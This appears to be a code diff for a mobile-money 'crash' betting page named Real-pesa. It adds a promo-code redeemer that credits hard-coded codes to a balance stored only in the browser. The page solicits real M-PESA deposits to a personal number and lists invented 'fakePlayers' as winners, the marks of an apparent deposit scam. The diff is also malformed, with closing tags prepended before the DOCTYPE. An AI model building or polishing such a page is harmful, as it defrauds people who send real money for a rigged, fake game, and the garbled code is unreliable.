@@ -1,3 +1,15 @@
+prepend(row);
+            localStorage.setItem('realPesaBalance', balance);
+            updateUI();
+        }
+    });
+
+    canvas.width = canvas.offsetWidth; canvas.height = canvas.offsetHeight;
+    updateUI();
+    startWaitingPeriod();
+</script>
+</body>
+</html>
 <!DOCTYPE html>
 <html lang="en">
 <head>
@@ -22,6 +34,9 @@
         #status { margin-top: 8px; font-size: 1rem; color: #ffc107; min-height: 1.2rem; font-weight: bold; }
         #profit-tracker { color: #00ff88; font-weight: bold; font-size: 1.2rem; margin-bottom: 5px; display: none; }
         .pochi-box { background: #111; padding: 12px; border-radius: 8px; border: 1px dashed #00ff88; font-size: 0.9rem; color: #00ff88; line-height: 1.4; }
+        .promo-section { border-top: 1px solid #333; padding-top: 10px; margin-top: 5px; }
+        #promoInput { font-size: 0.8rem; padding: 8px; margin-bottom: 5px; }
+        #promoBtn { background: #444; font-size: 0.8rem; padding: 8px; }
         .winners-title { font-size: 0.8rem; color: #aaa; text-align: left; margin-bottom: 5px; border-bottom: 1px solid #333; padding-bottom: 5px; }
         .winner-row { display: flex; justify-content: space-between; font-size: 0.85rem; padding: 4px 0; border-bottom: 1px solid #2a2a2a; }
         .win-amt { color: #00ff88; font-weight: bold; }
@@ -57,6 +72,12 @@
             Lipa na M-PESA Pochi: <br>
             <strong style="font-size: 1.2rem;">0797097831</strong>
         </div>
+        
+        <div class="promo-section">
+            <input type="text" id="promoInput" placeholder="Enter Deposit Code">
+            <button id="promoBtn">REDEEM CODE</button>
+        </div>
+
         <a id="whatsappBtn" href="https://wa.me/254797097831?text=I%20want%20to%20deposit%20to%20Real-pesa" target="_blank">
             Chat with Support (WhatsApp)
         </a>
@@ -75,12 +96,39 @@
     const historyBar = document.getElementById('historyBar');
     const profitDisplay = document.getElementById('profit-tracker');
     const winnersList = document.getElementById('winnersList');
+    const promoInput = document.getElementById('promoInput');
+    const promoBtn = document.getElementById('promoBtn');
     
     // STARTING BALANCE IS NOW 0
     let multiplier = 1.00, isFlying = false, betPlaced = false;
     let balance = parseInt(localStorage.getItem('realPesaBalance')) || 0;
     let history = JSON.parse(localStorage.getItem('realPesaHistory')) || [], currentBet = 0, crashPoint = 0, frame = 0;
     const fakePlayers = ["Musa_K", "Jabet_254", "Otieno_Pro", "SarahW", "Kamau_G", "Liz_B", "Brian_K", "Dancan_M", "Mercy_T", "Kiptoo"];
+
+    // PROMO CODES (Change these to whatever you want)
+    const codes = {
+        "PESA100": 100,
+        "PESA500": 500,
+        "ADMIN_RESET": 0
+    };
+
+    promoBtn.addEventListener('click', () => {
+        const val = promoInput.value.toUpperCase();
+        if (codes[val] !== undefined) {
+            if (val === "ADMIN_RESET") {
+                balance = 0;
+                alert("Balance Reset to 0");
+            } else {
+                balance += codes[val];
+                alert("Successfully added Ksh " + codes[val]);
+            }
+            localStorage.setItem('realPesaBalance', balance);
+            updateUI();
+            promoInput.value = "";
+        } else {
+            alert("Invalid Code!");
+        }
+    });
 
     function updateUI() {
         balDisplay.innerText = balance;
